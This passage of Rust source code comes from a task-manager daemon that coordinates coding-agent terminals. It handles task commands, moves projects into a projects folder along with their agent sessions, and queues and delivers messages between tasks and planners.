                log!("kanna-daemon: couldn't save {}'s new terminal {to}: {error}", entry.id);
            }
        }
    }

    pub fn install(self: &Rc<Self>, core: &CoreHandle) {
        let this = Rc::downgrade(self);
        core.on_renamed(Rc::new(move |from, to| {
            if let Some(this) = this.upgrade() {
                this.renamed(from, to);
            }
        }));
        core.set_tasks(Rc::new(Book(Rc::downgrade(self))));
        let this = Rc::downgrade(self);
        core.add_command(
            "replica",
            Rc::new(move |args, responder| match this.upgrade() {
                Some(this) if string(&args, "action") == Some("transfer") => this.take_transfer(&args, responder),
                Some(this) => responder.reply(this.replica_command(&args)),
                None => responder.reply(Err(KmuxError::new("app_gone", "the daemon is stopping"))),
            }),
        );
        let this = Rc::downgrade(self);
        core.add_command(
            "tasks",
            Rc::new(move |args, responder| {
                let Some(this) = this.upgrade() else { return responder.reply(Err(KmuxError::new("app_gone", "the daemon is stopping"))) };
                let mut args = args;
                if let Some(reference) = string(&args, "task").map(String::from) {
                    match this.resolve(&reference) {
                        Ok(Some(id)) => args["task"] = json!(id),
                        Ok(None) => {}
                        Err(error) => return responder.reply(Err(error)),
                    }
                }
                match args.get("action").and_then(Value::as_str) {
                    Some("new") => responder.reply(this.add(&args)),
                    Some("resolve") => responder.reply(this.find(&args)),
                    Some("edit") => responder.reply(this.edit(&args)),
                    Some("ready") => responder.reply(this.mark(&args)),
                    Some("unready") => responder.reply(this.unmark(&args)),
                    Some("name") => this.name(&args, responder),
                    Some("list") => this.listed(&args, responder),
                    Some("done") => this.done(&args, responder),
                    Some("start") => this.start(&args, responder),
                    Some("stop") => this.stop(&args, responder),
                    Some("setup") => this.setup(&args, responder),
                    Some("pick") => this.pick(&args, responder),
                    Some("shelve") => this.shelve(&args, responder),
                    Some("move") => this.move_task(&args, responder),
                    Some("plan") => this.plan(&args, responder),
                    Some("planner") => this.planner(&args, responder),
                    Some("events") => responder.reply(this.events(&args)),
                    Some("activated") => responder.reply(this.activated(&args)),
                    Some("show") => responder.reply(this.show(&args)),
                    Some("send") => responder.reply(this.send(&args)),
                    Some("messages") => responder.reply(this.messages(&args)),
                    _ => responder.reply(Err(bad("tasks needs an action: new, edit, ready, unready, name, list, show, resolve, done, start, stop, setup, pick, shelve, plan, planner, events, activated, send or messages"))),
                }
            }),
        );
        let this = Rc::downgrade(self);
        core.add_command(
            "project",
            Rc::new(move |args, responder| {
                let Some(this) = this.upgrade() else { return responder.reply(Err(gone())) };
                match args.get("action").and_then(Value::as_str) {
                    Some("import") => this.import(&args, responder),
                    Some("asked") => responder.reply(this.asked(&args)),
                    Some("never") => responder.reply(this.never(&args)),
                    _ => responder.reply(Err(bad("project needs an action: import, asked or never"))),
                }
            }),
        );
    }

    fn outside_project(&self, args: &Value) -> Result<PathBuf, KmuxError> {
        let repos = self.repos.borrow().clone().ok_or_else(|| bad("this Kanna keeps no projects folder"))?;
        let path = string(args, "path").map(|p| project_import::expand(p, &crate::agents::home())).filter(|p| p.is_absolute()).ok_or_else(|| bad("say which project: an absolute path"))?;
        let (main, _) = crate::projects::misplaced(&repos, &path).ok_or_else(|| KmuxError::new("in_place", format!("{} is in its place already", crate::projects::tilde(&path))))?;
        Ok(crate::projects::canonical(&main))
    }

    fn asked(&self, args: &Value) -> Result<Map, KmuxError> {
        let main = self.outside_project(args)?;
        let never = self.db.never_imports(&main.to_string_lossy()).map_err(|e| KmuxError::new("failed", format!("couldn't read {}: {e}", db::FILE)))?;
        Ok(Map::from_iter([("path".to_string(), json!(main)), ("never".to_string(), json!(never))]))
    }

    fn never(&self, args: &Value) -> Result<Map, KmuxError> {
        let main = self.outside_project(args)?;
        self.db.never_import(&main.to_string_lossy()).map_err(|e| KmuxError::new("failed", format!("couldn't write {}: {e}", db::FILE)))?;
        log!("kanna-daemon: {} won't be offered for import again", main.display());
        Ok(Map::from_iter([("path".to_string(), json!(main)), ("never".to_string(), json!(true))]))
    }

    fn import(self: &Rc<Self>, args: &Value, responder: Responder) {
        let Some(core) = self.core.upgrade() else { return responder.reply(Err(gone())) };
        let Some(repos) = self.repos.borrow().clone() else { return responder.reply(Err(bad("this Kanna keeps no projects folder"))) };
        let home = crate::agents::home();
        let Some(path) = string(args, "path").map(|p| project_import::expand(p, &home)).filter(|p| p.is_absolute()) else { return responder.reply(Err(bad("say which project: kanna project import PATH"))) };
        let homes: Vec<PathBuf> = std::iter::once(home).chain(std::env::var_os("HOME").map(PathBuf::from)).collect();
        let plan = match project_import::plan(&repos, &path, &homes) {
            Ok(plan) => plan,
            Err(error) => return responder.reply(Err(error)),
        };
        let shown = crate::projects::tilde(&plan.from);
        let starting = self.pending.borrow().values().any(|p| plan.holds(&p.entry.repo)) || self.tearing_down.borrow().values().any(|t| plan.holds(&t.entry.repo)) || self.setting_up.borrow().values().any(|s| plan.holds(&s.worktree.to_string_lossy()));
        if starting || self.importing.borrow().is_some() {
            return responder.reply(Err(KmuxError::new("busy", format!("a task in {shown} is starting, setting up or ending, or a project is being imported: import it once that's done"))));
        }
        let mut tasks: Vec<(String, String)> = self.running.borrow().iter().filter(|r| plan.holds(&r.entry.repo) && alive(&core, &r.pane)).map(|r| (r.entry.id.clone(), r.pane.clone())).collect();
        tasks.extend(self.entries.borrow().iter().filter(|e| plan.holds(&e.repo)).filter_map(|e| e.held.clone().filter(|pane| alive(&core, pane)).map(|pane| (e.id.clone(), pane))));
        let caller = string(args, "by").and_then(|by| core.pane(by));
        if let Some(caller) = caller.as_ref().filter(|c| c.cwd.as_deref().is_some_and(|cwd| plan.holds(cwd)) || tasks.iter().any(|(_, pane)| *pane == c.id)) {
            return responder.reply(Err(KmuxError::new("here", format!("{} is in {shown}, and the import stops every terminal there: run kanna project import from a terminal outside it", caller.label()))));
        }
        let caller = caller.map(|c| c.id);
        let by = who(args).map(String::from);
        *self.importing.borrow_mut() = Some(plan.clone());
        log!("kanna-daemon: importing {} to {}: stopping {} task(s)", plan.from.display(), plan.to.display(), tasks.len());
        let this = Rc::downgrade(self);
        let ids: Vec<String> = tasks.iter().map(|(id, _)| id.clone()).collect();
        let stopped = Join::new(tasks.len(), move |errors| {
            let Some(this) = this.upgrade() else { return responder.reply(Err(gone())) };
            if !errors.is_empty() {
                return this.restart_after_import(plan, ids, vec![], by, Err(format!("couldn't stop every task: {}", errors.join("; "))), responder);
            }
            this.end_terminals(plan, ids, caller, by, responder);
        });
        for (id, _) in tasks {
            let join = stopped.clone();
            core.handle(json!({ "cmd": "tasks", "args": { "action": "stop", "task": id, "by": who(args) } }), move |reply| join.done(failed(&reply).map(|e| e.message)));
        }
    }

    fn end_terminals(self: &Rc<Self>, plan: project_import::Import, tasks: Vec<String>, caller: Option<String>, by: Option<String>, responder: Responder) {
        let Some(core) = self.core.upgrade() else { return responder.reply(Err(gone())) };
        let planners = self.planners();
        let live: Vec<Pane> = core.with_panes(|panes| panes.iter().filter(|p| p.kind == kanna_mux::PaneType::Term && matches!(p.state, PaneState::Starting | PaneState::Running)).cloned().collect());
        let ending: Vec<String> = live.into_iter().filter(|p| Some(&p.id) != caller.as_ref() && [&p.cwd, &p.opened_in].into_iter().flatten().any(|f| plan.holds(f))).map(|p| p.id).collect();
        let this = Rc::downgrade(self);
        let terminals = ending.clone();
        let ended = Join::new(ending.len(), move |errors| {
            let Some(this) = this.upgrade() else { return responder.reply(Err(gone())) };
            let result = match errors.is_empty() {
                true => project_import::copy(&plan),
                false => Err(format!("couldn't stop every terminal: {}", errors.join("; "))),
            };
            this.restart_after_import(plan, tasks, terminals, by, result, responder);
        });
        for pane in ending {
            let join = ended.clone();
            let key = project(core.pane(&pane).and_then(|p| p.cwd).as_deref()).map(|p| p.to_string_lossy().into_owned());
            let kept = key.filter(|_| planners.contains(&pane)).and_then(|key| self.db.planner(&key).ok().flatten()).filter(|k| k.get("running") == Some(&Value::Bool(true)) && string(k, "pane") == Some(pane.as_str()));
            let weak = core.weak();
            let end = move |pane: String| match weak.upgrade() {
                Some(core) => core.end(&pane, move |ended| join.done(ended.err().map(|e| e.message))),
                None => join.done(Some("the daemon is stopping".into())),
            };
            match kept.as_ref().and_then(|k| string(k, "agent")).and_then(|name| planner_program(name, None)) {
                Some(program) => {
                    let id = pane.clone();
                    self.end_agent(&pane, &program, move |_| end(id));
                }
                None => end(pane),
            }
        }
    }

    fn restart_after_import(self: &Rc<Self>, plan: project_import::Import, tasks: Vec<String>, terminals: Vec<String>, by: Option<String>, copied: Result<project_import::Copied, String>, responder: Responder) {
        self.importing.borrow_mut().take();
        let Some(core) = self.core.upgrade() else { return responder.reply(Err(gone())) };
        let mut reply = Map::new();
        if let Ok(copied) = &copied {
            let mut sessions = project_import::Carried::default();
            for from in plan.froms() {
                let found = project_import::Stores::here().carry(&from, &plan.to);
                sessions = project_import::Carried { claude: sessions.claude + found.claude, codex: sessions.codex + found.codex, opencode: sessions.opencode + found.opencode, kept: [sessions.kept, found.kept].concat() };
                if let Err(error) = self.db.relocate(&from.to_string_lossy(), &plan.to.to_string_lossy()) {
                    log!("kanna-daemon: couldn't point {}'s records at {} in {}: {error}", from.display(), plan.to.display(), db::FILE);
                    sessions.kept.push(format!("{}: {error}", db::FILE));
                }
            }
            self.relocate_entries(&plan);
            core.edit_panes(|pane| {
                let mut edited = false;
                for field in [&mut pane.cwd, &mut pane.opened_in, &mut pane.path] {
                    if let Some(shifted) = field.as_deref().and_then(|f| plan.shifted(f)) {
                        *field = Some(shifted);
                        edited = true;
                    }
                }
                edited
            });
            log!("kanna-daemon: imported {} to {} ({} worktree(s), {} left with the original, {} Claude folder(s), {} codex, {} opencode session(s))", plan.from.display(), plan.to.display(), copied.worktrees, copied.outside.len(), sessions.claude, sessions.codex, sessions.opencode);
            reply.insert("from".into(), json!(plan.from));
            reply.insert("to".into(), json!(plan.to));
            reply.insert("worktrees".into(), json!(copied.worktrees));
            reply.insert("outside".into(), json!(copied.outside));
            reply.insert("sessions".into(), sessions.to_value());
            reply.insert("tasks".into(), json!(tasks));
            reply.insert("terminals".into(), json!(terminals));
            reply.insert("mentions".into(), json!(project_import::mentions(&crate::agents::home(), &plan.to, &plan.from)));
        }
        let this = Rc::downgrade(self);
        let failure = copied.err();
        let restarted = Join::new(tasks.len() + terminals.len(), move |errors| {
            if let Some(this) = this.upgrade() {
                this.changed();
            }
            match failure {
                Some(error) => responder.reply(Err(KmuxError::new("failed", if errors.is_empty() { error } else { format!("{error}; and couldn't start again: {}", errors.join("; ")) }))),
                None => {
                    reply.insert("failed".into(), json!(errors));
                    responder.reply(Ok(reply));
                }
            }
        });
        for id in tasks {
            let join = restarted.clone();
            core.handle(json!({ "cmd": "tasks", "args": { "action": "start", "task": id, "by": opt(by.as_deref()) } }), move |reply| join.done(failed(&reply).map(|e| e.message)));
        }
        for pane in terminals {
            let join = restarted.clone();
            core.handle(json!({ "cmd": "restart", "args": { "pane": pane } }), move |reply| join.done(failed(&reply).map(|e| e.message)));
        }
    }

    fn relocate_entries(&self, plan: &project_import::Import) {
        let fix = |entry: &mut Entry| {
            let repo = plan.shifted(&entry.repo);
            let folder = entry.folder.as_deref().and_then(|f| plan.shifted(f));
            entry.repo = repo.unwrap_or_else(|| entry.repo.clone());
            entry.folder = folder.or_else(|| entry.folder.clone());
        };
        self.entries.borrow_mut().iter_mut().for_each(fix);
        self.running.borrow_mut().iter_mut().for_each(|r| fix(&mut r.entry));
        for message in self.waiting.borrow_mut().iter_mut() {
            if let Some(repo) = plan.shifted(&message.repo) {
                message.repo = repo;
            }
        }
        self.changed();
    }

    fn find(&self, args: &Value) -> Result<Map, KmuxError> {
        let id = string(args, "task").ok_or_else(|| bad("say which task"))?;
        let waiting = self.entries.borrow().iter().find(|e| e.id == id).map(|e| (e.clone(), Place::Shelf, e.held.clone()));
        let running = || self.running.borrow().iter().find(|r| r.entry.id == id).map(|r| (r.entry.clone(), r.place, Some(r.pane.clone())));
        let (entry, place, pane) = waiting.or_else(running).ok_or_else(|| KmuxError::new("not_found", format!("no task \"{id}\"")))?;
        Ok(Map::from_iter([("task".to_string(), json!({ "id": entry.id, "short": self.short(&entry.id), "name": opt(entry.name.as_deref()), "place": place.as_str(), "pane": opt(pane.as_deref()) }))]))
    }

    fn events(&self, args: &Value) -> Result<Map, KmuxError> {
        let reference = string(args, "task").ok_or_else(|| bad("say which task"))?;
        let id = self.task_of(reference).unwrap_or_else(|| reference.to_string());
        let events = self.db.events(&id).map_err(|error| KmuxError::new("failed", format!("couldn't read {id}'s events: {error}")))?;
        let events = events
            .into_iter()
            .map(|e| json!({ "at": num(e.at), "what": e.what, "from": opt(e.from.map(Place::as_str)), "to": opt(e.to.map(Place::as_str)), "by": opt(e.by.as_deref()), "doc": e.doc }))
            .collect();
        Ok(Map::from_iter([("task".to_string(), json!(id)), ("events".to_string(), Value::Array(events))]))
    }

    fn sender(&self, args: &Value) -> (String, Option<String>) {
        let Some(pane) = who(args) else { return (USER.into(), None) };
        if let Some(id) = self.task_of(pane) {
            let repo = self.known(&id).map(|e| e.repo);
            return (id, repo);
        }
        if self.planners().iter().any(|p| p == pane) {
            let repo = self.core.upgrade().and_then(|core| core.pane(pane)).and_then(|p| project(p.cwd.as_deref())).map(|r| r.to_string_lossy().into_owned());
            return (PLANNER.into(), repo);
        }
        (USER.into(), None)
    }

    fn send(&self, args: &Value) -> Result<Map, KmuxError> {
        let to = string(args, "to").ok_or_else(|| bad("say who to: a task, or planner"))?;
        let text = string(args, "text").map(str::trim).filter(|t| !t.is_empty()).ok_or_else(|| bad("say what: kanna task send TASK TEXT"))?;
        let (from, here) = self.sender(args);
        let here = here.or_else(|| string(args, "repo").map(String::from));
        let (recipient, repo, agent) = if to == PLANNER {
            let repo = here.ok_or_else(|| bad("which repo's planner? run it in the repo"))?;
            (PLANNER.to_string(), repo, None)
        } else {
            let id = self.resolve(to)?.ok_or_else(|| not_found(to))?;
            let entry = self.known(&id).ok_or_else(|| not_found(to))?;
            if !self.is_open(&id) {
                return Err(KmuxError::new("done", format!("{} is done, so it takes no messages", self.short(&id))));
            }
            (id, entry.repo, Some(program(&entry.agent).to_string()))
        };
        let mode = if from == USER { None } else { who(args).and_then(|pane| self.permissions(pane)) };
        let message = self.queue(&recipient, &repo, &from, text, mode)?;
        let pane = self.recipient_pane(&message, &self.planners());
        let state = match &pane {
            Some(pane) => self.core.upgrade().and_then(|core| core.pane(pane)).and_then(|p| p.status).unwrap_or_else(|| "running".into()),
            None if recipient == PLANNER => "no-planner".into(),
            None => "stopped".into(),
        };
        let warning = match pane.and_then(|pane| self.channel(&pane)) {
            Some(channel) => self.undeliverable(&channel),
            None => agent.filter(|agent| !messages::AGENTS.contains(&agent.as_str())).map(|agent| format!("{agent} can't take messages: only {} can", messages::AGENTS.join(" and "))),
        };
        if let Some(why) = &warning {
            log!("kanna-daemon: warning: the message for {recipient} waits: {why}");
        }
        let to = if recipient == PLANNER { json!(PLANNER) } else { json!({ "id": recipient, "short": self.short(&recipient) }) };
        Ok(Map::from_iter([("message".to_string(), json!(message.id)), ("to".to_string(), to), ("state".to_string(), json!(state)), ("warning".to_string(), opt(warning.as_deref()))]))
    }

    fn queue(&self, recipient: &str, repo: &str, from: &str, text: &str, mode: Option<&str>) -> Result<Message, KmuxError> {
        let message = self.db.put_message(recipient, repo, from, text, mode).map_err(|error| KmuxError::new("failed", format!("couldn't save the message in {}: {error}", db::FILE)))?;
        log!("kanna-daemon: a message from {from} waits for {recipient}");
        self.waiting.borrow_mut().push(message.clone());
        self.refill();
        Ok(message)
    }

    pub fn recipient(&self, to: &str) -> Result<String, KmuxError> {
        if to == PLANNER {
            return Ok(PLANNER.to_string());
        }
        let id = self.resolve(to)?.ok_or_else(|| not_found(to))?;
        if !self.is_open(&id) {
            return Err(KmuxError::new("done", format!("{} is done, so it takes no messages", self.short(&id))));
        }
        Ok(id)
    }

    pub fn post(&self, recipient: &str, repo: Option<&str>, from: &str, text: &str) -> Result<i64, KmuxError> {
        let repo = match recipient {
            PLANNER => repo.map(String::from).ok_or_else(|| bad("which repo's planner?"))?,
            id => {
                if !self.is_open(id) {
                    return Err(KmuxError::new("done", format!("{} is done, so it takes no messages", self.short(id))));
                }
                self.known(id).ok_or_else(|| not_found(id))?.repo
            }
        };
        Ok(self.queue(recipient, &repo, from, text, None)?.id)
    }

    pub fn waiting(&self, message: i64) -> bool {
        self.waiting.borrow().iter().any(|m| m.id == message)
    }

    pub fn label_of(&self, recipient: &str) -> String {
        if recipient == PLANNER { recipient.to_string() } else { self.short(recipient) }
    }

    fn messages(&self, args: &Value) -> Result<Map, KmuxError> {
        let task = match string(args, "task") {
            Some(reference) => Some(self.task_of(reference).or(self.resolve(reference)?).ok_or_else(|| not_found(reference))?),
            None => None,
        };
        let list = self.db.messages(task.as_deref()).map_err(|error| KmuxError::new("failed", format!("couldn't read the messages: {error}")))?;
        let named = |who: &str| if db::is_task_id(who) { json!({ "id": who, "short": self.short(who) }) } else { json!(who) };
        let planners = self.planners();
        let warning = |m: &Message| m.delivered.is_none().then(|| self.recipient_pane(m, &planners)).flatten().and_then(|pane| self.warned.borrow().get(&pane).cloned());
        let list = list
            .iter()
            .map(|m| json!({ "id": m.id, "at": num(m.at), "from": named(&m.sender), "to": named(&m.recipient), "repo": m.repo, "delivered": m.delivered.map(num), "warning": warning(m), "text": m.text }))
            .collect();
        Ok(Map::from_iter([("task".to_string(), opt(task.as_deref())), ("messages".to_string(), Value::Array(list))]))
    }

    fn recipient_pane(&self, message: &Message, planners: &[String]) -> Option<String> {
        let core = self.core.upgrade()?;
        if message.recipient != PLANNER {
            return self.pane_of(&message.recipient).filter(|pane| alive(&core, pane));
        }
        self.planner_of(&message.repo, planners)
    }

    fn planners(&self) -> Vec<String> {
        self.planners.borrow().as_ref().map_or(vec![], |planners| planners())
    }

    fn has_mail(&self, pane: &str) -> bool {
        self.task_of(pane).is_some_and(|id| self.waiting.borrow().iter().any(|m| m.recipient == id)) && self.channel(pane).is_some_and(|channel| self.undeliverable(&channel).is_none())
    }

    fn deliver(self: &Rc<Self>, core: &CoreHandle, now: Instant) -> Option<Instant> {
        let waiting = self.waiting.borrow().clone();
        if waiting.is_empty() {
            return None;
        }
        let planners = if waiting.iter().any(|m| m.recipient == PLANNER) { self.planners() } else { vec![] };
        let mut by_pane: Vec<(String, Vec<Message>)> = vec![];
        for message in waiting {
            let Some(pane) = self.recipient_pane(&message, &planners) else { continue };
            match by_pane.iter_mut().find(|(p, _)| *p == pane) {
                Some((_, list)) => list.push(message),
                None => by_pane.push((pane, vec![message])),
            }
        }
        let mut next = None;
        for (pane, _) in &by_pane {
            if !self.ready.borrow().contains_key(pane) {
                let mut ready = Ready::new(now);
                ready.see(core.pane(pane).and_then(|p| p.status).as_deref().and_then(Status::parse), now);
                self.ready.borrow_mut().insert(pane.clone(), ready);
            }
        }
        for (pane, list) in by_pane {
            if self.delivering.borrow().contains(&pane) || self.quitting.borrow().contains_key(&pane) || self.setting_up.borrow().contains_key(&pane) {
                continue;
            }
            let Some(channel) = self.channel(&pane) else { continue };
            let at = self.ready.borrow().get(&pane).and_then(Ready::at);
            match at {
                Some(at) if at <= now => match self.undeliverable(&channel) {
                    Some(why) => {
                        self.warn(&pane, why);
                        next = Some(next.map_or(now + messages::RETRY, |n: Instant| n.min(now + messages::RETRY)));
                    }
                    None => self.hand_over(pane, list, channel),
                },
                Some(at) => next = Some(next.map_or(at, |n: Instant| n.min(at))),
                None => {}
            }
        }
        next
    }

    fn channel(&self, pane: &str) -> Option<Channel> {
        self.channel.borrow().as_ref().and_then(|channel| channel(pane))
    }

    fn permissions(&self, pane: &str) -> Option<&'static str> {
        self.permissions.borrow().as_ref().and_then(|permissions| permissions(pane))
    }

    fn undeliverable(&self, channel: &Channel) -> Option<String> {
        match channel {
            Channel::Other(agent) => Some(format!("{agent} can't take messages: only {} can", messages::AGENTS.join(" and "))),
            channel => channel.socket().and_then(Result::err).map(String::from),
        }
    }

    fn warn(&self, pane: &str, why: String) {
        if self.warned.borrow().get(pane) != Some(&why) {
            log!("kanna-daemon: warning: the messages for {pane} wait: {why}");
            if let Some(on_warn) = self.on_warn.borrow().as_ref() {
                let name = self.task_of(pane).and_then(|id| self.known(&id)).and_then(|e| e.name).unwrap_or_else(|| pane.to_string());
                on_warn(pane, &name, &why);
            }
            self.warned.borrow_mut().insert(pane.to_string(), why);
        }
    }

    fn hand_over(self: &Rc<Self>, pane: String, list: Vec<Message>, channel: Channel) {
        let named = |who: &str| if db::is_task_id(who) { self.label(who) } else { who.to_string() };
        let text = messages::prompt(&list.iter().map(|m| (named(&m.sender), m.text.clone())).collect::<Vec<_>>());
        let theirs = self.permissions(&pane);
        let modes: Option<Vec<&str>> = list.iter().map(|m| if messages::yours(&m.sender) { theirs } else { m.mode.as_deref() }).collect();
        let mode = modes.map(|modes| if modes.iter().all(|mode| *mode == messages::BYPASS) { messages::BYPASS } else { messages::PROMPTING });
        self.delivering.borrow_mut().insert(pane.clone());
        let token = self.next.get() + 1;
        self.next.set(token);
        self.posting.borrow_mut().insert(token, (pane, list));
        let events = self.events.clone();
        std::thread::spawn(move || {
            let result = messages::deliver(&channel, &text, mode);
            let _ = events.send(Event::Posted { token, result });
        });
    }

    pub fn posted(self: &Rc<Self>, token: u64, result: Result<(), String>) {
        if let Some((pane, list)) = self.posting.borrow_mut().remove(&token) {
            self.handed(pane, list, result);
        }
    }

    fn handed(self: &Rc<Self>, pane: String, list: Vec<Message>, result: Result<(), String>) {
        self.delivering.borrow_mut().remove(&pane);
        let now = Instant::now();
        if let Some(ready) = self.ready.borrow_mut().get_mut(&pane) {
            ready.sent(now);
        }
        if let Err(error) = result {
            return log!("kanna-daemon: couldn't give {pane} its messages ({error}); they wait");
        }
        self.warned.borrow_mut().remove(&pane);
        let ids: Vec<i64> = list.iter().map(|m| m.id).collect();
        if let Err(error) = self.db.delivered(&ids) {
            log!("kanna-daemon: couldn't mark {pane}'s messages delivered in {}: {error}", db::FILE);
        }
        self.waiting.borrow_mut().retain(|m| !ids.contains(&m.id));
        if let Some(turn) = self.turns.borrow_mut().get_mut(&pane) {
            let status = self.core.upgrade().and_then(|core| core.pane(&pane)).and_then(|p| p.status);
            *turn = Turn::underway();
            turn.see(status.as_deref().and_then(Status::parse), now + messages::PICKUP);
        }
        for m in &list {
            self.note(&pane, Change::new("messaged").by(Some(&m.sender)).with("message", json!(m.id)));
        }
        log!("kanna-daemon: gave {pane} {} message(s)", ids.len());
    }

    fn mint(&self, args: &Value, name: Option<String>, message: Option<String>) -> Result<Entry, KmuxError> {
        let repo = string(args, "repo").filter(|r| Path::new(r).is_absolute() && Path::new(r).is_dir()).ok_or_else(|| bad("a task needs its repo: an absolute path to a folder"))?;
        if git(Path::new(repo), &["rev-parse", "--show-toplevel"]).is_err() {
            return Err(bad(format!("{repo} isn't a git repo: a task works in a worktree of the repo, so set one up first (git init)")));
        }
        self.placed(repo)?;
        let by = string(args, "by").and_then(|by| self.core.upgrade()?.pane(by)).map(|pane| pane.id);
        let id = self.db.new_id(|id| !taken(Path::new(repo), id) && self.replica.borrow().births(id).is_empty()).map_err(|error| {
            log!("kanna-daemon: couldn't save a new task ID in {}: {error}", db::FILE);
            KmuxError::new("failed", format!("couldn't save a new task ID: {error}"))
        })?;
        Ok(Entry {
            id,
            name,
            message,
            repo: repo.to_string(),
            by,
            made_at: now(),
            agent: string(args, "agent").filter(|a| !a.trim().is_empty()).map(String::from).unwrap_or_else(|| task_agent(&config_files(Path::new(repo)))),
            birth: Some(self.replica.borrow_mut().tick().text()),
            on: strings(args, "on"),
            ..Default::default()
        })
    }

    fn add(&self, args: &Value) -> Result<Map, KmuxError> {
        let name = string(args, "name").map(str::trim).filter(|n| !n.is_empty()).ok_or_else(|| bad("a task needs a name"))?.to_string();
        let message = string(args, "message").map(str::trim).filter(|m| !m.is_empty()).map(String::from);
        let after = self.blockers(args, "")?.unwrap_or_default();
        let entry = Entry { after, ..self.mint(args, Some(name), message)? };
        self.store(&entry, Place::Shelf, None, Some(Change { to: Some(Place::Shelf), ..Change::new("made") }.by(entry.by.as_deref().or(who(args)))))?;
        let value = self.described(&entry);
        insert_in_order(&mut self.entries.borrow_mut(), entry);
        self.changed();
        self.refill();
        Ok(Map::from_iter([("task".to_string(), value)]))
    }

    fn listed(&self, args: &Value, responder: Responder) {
        let mut listed = self.list(args);
        if args.get("merged") != Some(&Value::Bool(true)) {
            return responder.reply(Ok(listed));
        }
        let repo = string(args, "repo");
        let worktrees: Vec<(String, PathBuf, PathBuf)> = self
            .entries
            .borrow()
            .iter()
            .chain(self.running.borrow().iter().map(|r| &r.entry))
            .filter(|e| repo.is_none_or(|r| e.repo == r))
            .map(|e| (e.id.clone(), PathBuf::from(&e.repo), e.folder.as_ref().map_or_else(|| Path::new(&e.repo).join(WORKTREES).join(&e.id), PathBuf::from)))
            .collect();
        std::thread::spawn(move || {
            let merged: HashSet<String> = std::thread::scope(|scope| {
                let checks: Vec<_> = worktrees.iter().map(|(id, repo, worktree)| scope.spawn(move || task_scripts::merged(repo, worktree).then(|| id.clone()))).collect();
                checks.into_iter().filter_map(|check| check.join().ok().flatten()).collect()
            });
            for list in ["shelf", "desk"] {
                for task in listed.get_mut(list).and_then(Value::as_array_mut).into_iter().flatten() {
                    let id = task["id"].as_str().unwrap_or_default().to_string();
                    task["merged"] = json!(merged.contains(&id));
                }
            }
            responder.reply(Ok(listed));
        });
    }

    fn list(&self, args: &Value) -> Map {
        let repo = string(args, "repo");
        let core = self.core.upgrade();
        let entries = self.entries.borrow().clone();
        let replied: HashSet<String> = self.waiting.borrow().iter().filter(|m| m.recipient == PLANNER).map(|m| m.sender.clone()).collect();
        let tasks = entries
            .iter()
            .filter(|e| repo.is_none_or(|r| e.repo == r))
            .map(|e| {
                let mut value = self.described(e);
                let pane = e.held.as_deref().zip(core.as_ref()).and_then(|(pane, core)| core.pane(pane).map(|p| (alive(core, pane), p)));
                value["running"] = json!(pane.as_ref().is_some_and(|(running, _)| *running));
                value["status"] = opt(pane.as_ref().and_then(|(_, p)| p.status()));
                value["replied"] = json!(replied.contains(&e.id));
                value
            })
            .collect();
        let out = self
            .running
            .borrow()
            .iter()
            .filter(|r| repo.is_none_or(|repo| r.entry.repo == repo))
            .map(|r| {
                let mut value = json!({ "id": r.entry.id, "short": self.short(&r.entry.id), "pane": r.pane, "repo": r.entry.repo, "replied": replied.contains(&r.entry.id), "branch": opt(r.entry.folder.as_deref().and_then(branch_of).as_deref()) });
                self.stack_fields(&r.entry, &mut value);
                value
            })
            .collect();
        let agent = task_agent(&repo.map_or_else(|| vec![crate::agents::home().join(".kanna-v4/config.json")], |repo| config_files(Path::new(repo))));
        let scripts: Map = self
            .running
            .borrow()
            .iter()
            .filter(|r| repo.is_none_or(|repo| r.entry.repo == repo))
            .filter_map(|r| {
                let running = core.as_ref().is_some_and(|core| alive(core, &r.pane));
                self.script_said(&r.entry, Some(&r.pane), running).map(|said| (r.pane.clone(), json!(said)))
            })
            .collect();
        let project = repo.and_then(identity);
        let machines = self.machines();
        let replica = self.replica.borrow();
        let mut records: Vec<&replica::Record> = replica
            .records()
            .filter(|r| r.text("state").is_some_and(|s| s != "done") && r.text("owner").is_some_and(|o| o != replica.me()) && !self.is_open(&r.task))
            .filter(|r| repo.is_none() || (project.is_some() && r.text("project") == project.as_deref()))
            .collect();
        records.sort_by_key(|r| r.born());
        let elsewhere = records
            .into_iter()
            .map(|r| {
                let mut value = r.to_value();
                value["id"] = json!(r.task);
                value["machine"] = json!(machines.name_of(r.text("owner").unwrap_or_default()));
                value["madeAt"] = num(r.born().ms as f64 / 1000.0);
                value
            })
            .collect();
        let twice: Map = replica
            .records()
            .filter(|r| r.runs().len() > 1 && r.text("state") != Some("done"))
            .map(|r| (r.task.clone(), json!(r.runs().into_iter().map(|device| machines.name_of(device)).collect::<Vec<_>>())))
            .collect();
        let mut reply = Map::from_iter([("shelf".to_string(), Value::Array(tasks)), ("desk".to_string(), Value::Array(out)), ("script".to_string(), Value::Object(scripts)), ("agent".to_string(), json!(agent)), ("elsewhere".to_string(), Value::Array(elsewhere)), ("twice".to_string(), Value::Object(twice))]);
        if args.get("done").and_then(Value::as_bool) == Some(true) {
            let done = self.db.done_tasks().unwrap_or_else(|error| {
                eprintln!("kanna-daemon: can't read the done tasks in {}: {error}", db::FILE);
                vec![]
            });
            let open = self.open_tasks();
            let ids: Vec<&str> = open.iter().map(|e| e.id.as_str()).chain(done.iter().map(|(row, _)| row.id.as_str())).collect();
            let done = done
                .iter()
                .filter(|(row, _)| repo.is_none_or(|r| row.repo == r))
                .map(|(row, at)| {
                    let entry = Entry::from_row(row);
                    json!({ "id": entry.id, "short": db::short_id(&entry.id, ids.iter().copied()), "name": opt(entry.name.as_deref()), "message": opt(entry.message.as_deref()), "repo": entry.repo, "agent": entry.agent, "madeAt": num(entry.made_at), "doneAt": num(*at) })
                })
                .collect();
            reply.insert("done".to_string(), Value::Array(done));
        }
        reply
    }

    /// A task by its ID, wherever it is, done ones too: where it is, and for a done one, when it was done and its branch if that's still there.
    fn show(&self, args: &Value) -> Result<Map, KmuxError> {
        let reference = string(args, "task").ok_or_else(|| bad("say which task"))?;
        let start = reference.to_lowercase();
        let start = if start.starts_with(db::TASK) { start } else { format!("{}{start}", db::TASK) };
        let failed = |error: rusqlite::Error| KmuxError::new("failed", format!("couldn't read {reference}: {error}"));
        let id = match self.db.ids_starting(&start).map_err(failed)?.as_slice() {
            [] => return Err(KmuxError::new("not_found", format!("no task \"{reference}\""))),
            [one] => one.clone(),
            many => return Err(KmuxError::new("ambiguous", format!("{reference} could be {} tasks: {}; say more of its ID", many.len(), many.iter().map(|id| self.label(id)).collect::<Vec<_>>().join(", ")))),
        };
        let id = id.as_str();
